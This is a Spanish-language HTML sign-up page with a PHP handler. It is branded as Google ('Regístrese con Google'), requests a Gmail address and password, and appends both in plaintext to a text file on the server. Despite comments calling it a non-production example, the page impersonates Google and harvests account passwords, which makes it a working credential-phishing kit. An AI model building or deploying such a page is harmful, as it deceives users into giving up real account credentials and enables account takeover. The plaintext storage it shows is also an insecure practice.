<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro - [Google]</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 20px;
            color: #333;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        h1 {
            color: #2c3e50;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }
        button:hover {
            background-color: #2980b9;
        }
        .login-link {
            text-align: center;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Regístrese con Google</h1>
        <form action="procesar_registro.php" method="POST">
            <div class="form-group">
                <label for="email">Correo electrónico:</label>
                <input type="email" id="email" name="email" required placeholder="usuario@gmail.com">
            </div>
            <div class="form-group">
                <label for="password">Contraseña:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Registrarse</button>
        </form>
        <div class="login-link">
            ¿Ya tienes una cuenta? <a href="login.html">Inicia sesión</a>
        </div>
    </div>
</body>
</html>
<?php
// Configuración básica de seguridad
header('Content-Type: text/html; charset=utf-8');

// Validar que se envió el formulario
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtener datos del formulario
    $email = filter_input(INPUT_POST, 'email', FILTER_SANITIZE_EMAIL);
    $password = $_POST['password']; // En una aplicación real, esto debería hashearse
    
    // Validaciones básicas
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        die("Por favor ingrese un correo electrónico válido.");
    }
    
    if (empty($password)) {
        die("La contraseña no puede estar vacía.");
    }
    
    // En una aplicación real:
    // 1. Deberías usar password_hash() para almacenar contraseñas de forma segura
    // 2. Los datos deberían guardarse en una base de datos, no en un archivo de texto
    
    // Ejemplo básico (NO USAR EN PRODUCCIÓN):
    $datos = "Email: $email, Contraseña: $password\n";
    file_put_contents('registros.txt', $datos, FILE_APPEND);
    
    // Redireccionar después del registro
    header('Location: registro_exitoso.html');
    exit;
} else {
    // Si alguien intenta acceder directamente al script
    header('Location: registro.html');
    exit;
}
?>
